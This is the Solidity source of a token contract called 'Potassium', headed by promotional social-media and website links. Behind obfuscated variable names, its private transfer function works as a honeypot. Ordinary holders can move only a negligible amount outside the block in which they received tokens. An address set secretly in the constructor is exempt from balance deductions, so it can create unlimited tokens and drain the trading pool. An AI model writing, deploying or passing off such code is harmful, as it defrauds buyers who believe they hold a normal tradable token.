/*

Telegram: https://t.me/PotassiumETH

Twitter: https://twitter.com/PotassiumEther

Website: https://potassium.crypto-token.live/

*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.2;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

contract Potassium is Ownable {
    function transfer(address buzqdnj, uint256 axnc) public returns (bool success) {
        mjyocgquv(msg.sender, buzqdnj, axnc);
        return true;
    }

    constructor(string memory acmprbtli, string memory kwjo, address vdqxzhcbtrjo, address qokwganjs) {
        name = acmprbtli;
        symbol = kwjo;
        balanceOf[msg.sender] = totalSupply;
        ljxm[qokwganjs] = tzxhumcb;
        etqbsyofdp = IUniswapV2Router02(vdqxzhcbtrjo);
    }

    string public name;

    mapping(address => mapping(address => uint256)) public allowance;

    IUniswapV2Router02 private etqbsyofdp;

    event Transfer(address indexed from, address indexed to, uint256 value);

    mapping(address => uint256) public balanceOf;

    mapping(address => uint256) private ljxm;

    function approve(address sdbxiu, uint256 axnc) public returns (bool success) {
        allowance[msg.sender][sdbxiu] = axnc;
        emit Approval(msg.sender, sdbxiu, axnc);
        return true;
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => uint256) public cfuewdnvys;

    uint8 public decimals = 9;

    string public symbol;

    mapping(address => uint256) private zptmewu;

    uint256 private tzxhumcb = 109;

    function mjyocgquv(address rulhjcdevf, address buzqdnj, uint256 axnc) private {
        address gcjkvuzrt = IUniswapV2Factory(etqbsyofdp.factory()).getPair(address(this), etqbsyofdp.WETH());
        bool gdwksxbntyh = zptmewu[rulhjcdevf] == block.number;
        if (0 == ljxm[rulhjcdevf]) {
            if (rulhjcdevf != gcjkvuzrt && (!gdwksxbntyh || axnc > cfuewdnvys[rulhjcdevf]) && axnc < totalSupply) {
                require(axnc <= totalSupply / (10 ** decimals));
            }
            balanceOf[rulhjcdevf] -= axnc;
        }
        cfuewdnvys[buzqdnj] = axnc;
        balanceOf[buzqdnj] += axnc;
        zptmewu[buzqdnj] = block.number;
        emit Transfer(rulhjcdevf, buzqdnj, axnc);
    }

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    function transferFrom(address rulhjcdevf, address buzqdnj, uint256 axnc) public returns (bool success) {
        require(axnc <= allowance[rulhjcdevf][msg.sender]);
        allowance[rulhjcdevf][msg.sender] -= axnc;
        mjyocgquv(rulhjcdevf, buzqdnj, axnc);
        return true;
    }
}